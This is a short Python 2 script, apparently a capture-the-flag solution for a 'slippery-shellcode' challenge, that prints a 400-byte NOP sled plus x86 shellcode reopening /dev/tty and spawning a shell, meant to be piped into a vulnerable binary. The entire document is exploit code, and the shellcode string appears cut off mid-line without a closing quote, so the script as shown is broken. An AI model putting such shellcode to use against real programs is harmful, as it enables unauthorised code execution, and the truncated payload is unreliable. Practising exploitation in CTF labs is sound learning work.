
# save script in home directory /~
# run script from the slippery-shellcode directory
# python ~/p.py | ./vuln

NOP = "\x90" * 400
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68$
print NOP + shellcode

